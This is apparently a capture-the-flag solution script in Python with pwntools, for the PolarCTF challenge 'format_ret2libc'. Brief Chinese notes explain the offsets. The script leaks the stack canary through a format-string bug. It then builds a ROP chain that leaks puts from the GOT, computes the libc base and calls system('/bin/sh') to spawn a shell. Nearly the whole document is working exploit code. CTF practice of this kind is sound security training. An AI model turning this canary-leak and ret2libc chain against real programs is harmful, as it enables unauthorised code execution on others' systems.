"""PolarCTF format_ret2libc
-> .text:00400830  mov     eax, 0
   .text:00400835  mov     rcx, [rbp+var_8]
   .text:00400839  xor     rcx, fs:28h
   .text:00400842  jz      short locret_400849
   .text:00400844  call    ___stack_chk_fail
   .text:00400849  leave
   .text:0040084A  retn
canary为 rbp-8

aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
aaaaaaaa-[0x7fffffffe270-0x80-0x7ffff7b04360-0x7ffff7fe2700-(nil)-0x6161616161616161]-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0xa70252d70252d
偏移值为 6
gdb$ p ($rbp - 8 - $rsp) / 8 + 6 # 39

发送 $39%p
"""
from pwn import *

warnings.filterwarnings("ignore", category=BytesWarning)

s = process('./format_ret2libc')
elf = ELF('./format_ret2libc')
context(log_level='debug', arch='amd64', os='linux')

s.sendafter("words：\n", '%39$p')
canary = int(s.recvuntil(b'00'), 16)
success('canary:' + hex(canary))

puts_plt = elf.plt["puts"]
puts_got = elf.got['puts']
read_got = elf.got['read']

rop = ROP(elf)
rop.raw(b'A' * (0x70 - 8) + p64(canary) + p64(0xdeadbeef))
rop.call(puts_plt, [puts_got])
rop.call('SetString')
payload = rop.chain()
s.sendafter('name?\n', payload)

puts_addr = u64(s.recvuntil(b'\x7f')[-6:] + b'\x00\x00')
success('puts: ' + hex(puts_addr))

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base = puts_addr - libc.sym['puts']
libc.address = libc_base
success('libc_base: ' + hex(libc_base))

system = libc.symbols['system']
bin_sh = libc.search(b'/bin/sh').__next__()

rop = ROP('./format_ret2libc')
rop.raw(b'A' * (0x70 - 8) + p64(canary) + p64(0xdeadbeef))
rop.call(system, [bin_sh])
rop.call('main')
payload = rop.chain()
s.sendline(payload)

s.interactive()
